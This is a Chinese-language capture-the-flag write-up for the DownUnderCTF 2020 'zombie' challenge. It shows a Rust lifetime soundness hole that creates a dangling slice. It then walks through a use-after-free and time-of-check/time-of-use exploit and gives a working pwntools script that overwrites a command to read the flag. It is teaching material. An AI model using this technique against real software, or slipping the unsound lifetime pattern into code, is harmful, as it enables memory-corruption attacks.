# DownUnderCTF 2020 - zombie

## 题目简述

附件是 Rust 程序。它利用 Rust 历史上的 lifetime soundness hole，把局部 `Vec<u8>` 的可变引用错误地扩展为 `'static`；`Vec` 离开函数后内存已释放，但主循环仍持有该切片，形成可读写悬空引用。目标是让这块内存与当前命令字符串的堆缓冲区重叠，在第一次检查之后把命令改成 `get flag`。

## 解题过程

产生悬空引用的代码为：

```rust
fn cell<'a, 'b, T: ?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }

fn virus<'a, T: ?Sized>(input: &'a mut T) -> &'static mut T {
    let f: fn(_, &'a mut T) -> &'static mut T = cell;
    f(&&(), input)
}

fn zombie(size: usize) -> &'static mut [u8] {
    let mut object = vec![b'A'; size];
    virus(object.as_mut())
}
```

这个模式源自 [rust-lang/rust#25860](https://github.com/rust-lang/rust/issues/25860)。返回时 `object` 被释放，而切片仍被保存到 `infected`。主循环又存在两次分离的命令判断：

```rust
match line.as_str().trim() {
    "get flag" => continue,
    "infect" => infected = Some(infect(&mut lines)),
    "eat brains" => eat_brains(&mut lines, &mut infected),
    _ => (),
}

if line.as_str().trim() == "get flag" {
    println!("Here's the flag: {}", read_to_string("flag.txt").unwrap());
}
```

直接输入 `get flag` 会在 `match` 中执行 `continue`，永远到不了第二次判断。先执行：

```text
infect
32
```

它创建并释放一个 32 字节堆块，同时保留悬空切片。接着构造带足够尾随空格、总长恰好为 31 字节的命令：

```python
eat_command = b"eat brains".ljust(31, b" ")
```

`trim()` 使它仍匹配 `eat brains`，而较长字符串会让 `line` 的缓冲区复用刚释放的同尺寸堆块。此时 `eat_brains` 通过悬空切片写入的正是 `line` 内容。

Rust `String` 记录长度而不是依赖 NUL 终止，所以不能只写 `get flag\0`。应覆盖原命令的前 10 字节为 `get flag` 加两个空格，使剩余内容与原有尾随空格一起被 `trim()` 去除：

```python
from pwn import *

io = remote("host", 1337)
io.sendline(b"infect")
io.sendline(b"32")
io.sendline(b"eat brains" + b" " * 21)

for index, value in enumerate(b"get flag  "):
    io.sendline(str(index).encode())
    io.sendline(str(value).encode())
io.sendline(b"done")
io.interactive()
```

`eat_brains` 返回后，第一次 `match` 已经结束，但第二个 `if` 会重新读取已被改写的 `line`；`trim()` 结果现在正是 `get flag`，于是输出：

```text
DUCTF{m3m0ry_s4f3ty_h4ck3d!}
```

## 方法总结

内存安全语言的保证依赖编译器与类型系统本身正确；一旦 lifetime 被错误扩展，后果仍是传统 UAF。本题的利用链是“伪造 `'static` 引用 → 释放后保留切片 → 分配器复用同尺寸块 → 悬空写修改活跃 `String` → 两次检查之间产生 TOCTOU”。利用时还必须理解 Rust 字符串以长度计界，NUL 字节不会像 C 字符串那样截断比较。
